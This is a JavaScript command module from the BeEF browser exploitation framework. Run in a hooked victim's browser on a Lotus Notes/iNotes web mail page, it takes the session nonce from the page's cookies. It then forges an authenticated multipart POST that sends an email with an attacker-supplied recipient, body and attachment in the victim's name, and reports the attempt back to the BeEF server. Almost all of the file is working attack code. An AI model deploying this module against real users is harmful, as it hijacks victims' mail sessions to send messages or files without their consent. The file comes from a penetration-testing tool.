//
//   Copyright (c) 2006-2015 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	var to = "<%= @to %>";
	var subject = "<%= @subject.gsub(/"/, '\\"').gsub(/\n/, '\\n').gsub(/\r/, '\\r') %>";
	var body = "<%= @body.gsub(/"/, '\\"').gsub(/\n/, '\\n').gsub(/\r/, '\\r') %>";
	var filename = "<%= @filename %>";
	var filedata = "<%= @filedata %>";

	//get URL for this nsf databse
	var currentURL = document.URL;
	var rx = /(.*\.nsf)/g;
	var arr = rx.exec(currentURL);
	var notesURL = arr[1];

	//extract nonce from ShimmerS-cookie
	var cookies = document.cookie;
	var rxc = /ShimmerS=.*?N:([A-Za-z0-9]*)/g;
	var arrc = rxc.exec(cookies);
	var nonce = arrc[1];
	
	var xhr = new XMLHttpRequest();
	var uri = notesURL + "/($Inbox)/$new/?EditDocument&Form=h_PageUI&PresetFields=h_EditAction;h_ShimmerEdit,s_ViewName;($Inbox),s_NotesForm;Memo&ui=dwa_form";
	xhr.open("POST", uri, true);
	xhr.withCredentials = true;

	var boundary = "---------------------------32162600713994";

	xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);


	var post_data = boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"%%Nonce\"\r\n";
	post_data += "\r\n";
	post_data += nonce + "\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"h_EditAction\"\r\n";
	post_data += "\r\n";
	post_data += "h_Next\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"h_SetReturnURL\"\r\n";
	post_data += "\r\n";
	post_data += "[[./&Form=l_CallListener]]\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"h_SetCommand\"\r\n";
	post_data += "\r\n";
	post_data += "h_ShimmerSendMail\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"h_SetSaveDoc\"\r\n";
	post_data += "\r\n";
	post_data += "1\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"SendTo\"\r\n";
	post_data += "\r\n";
	post_data += to + "\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"CopyTo\"\r\n";
	post_data += "\r\n";
	post_data += "\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"BlindCopyTo\"\r\n";
	post_data += "\r\n";
	post_data += "\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"Body\"\r\n";
	post_data += "\r\n";
	post_data += body + "\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"MailOptions\"\r\n";
	post_data += "\r\n";
	post_data += "1\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"Form\"\r\n";
	post_data += "\r\n";
	post_data += "Memo\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"s_UsePlainText\"\r\n";
	post_data += "\r\n";
	post_data += "0\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"s_UsePlainTextAndHTML\"\r\n";
	post_data += "\r\n";
	post_data += "1\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"Subject\"\r\n";
	post_data += "\r\n";
	post_data += subject + "\r\n";
	post_data += boundary + "\r\n";
	post_data += "Content-Disposition: form-data; name=\"HaikuUploadAttachment0\";  filename=\"" + filename + "\"\r\n";
	post_data += "\r\n";
	post_data += filedata + "\r\n";
	post_data += boundary + "--";
	xhr.sendAsBinary(post_data);

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Attempt to send note.');
});





 
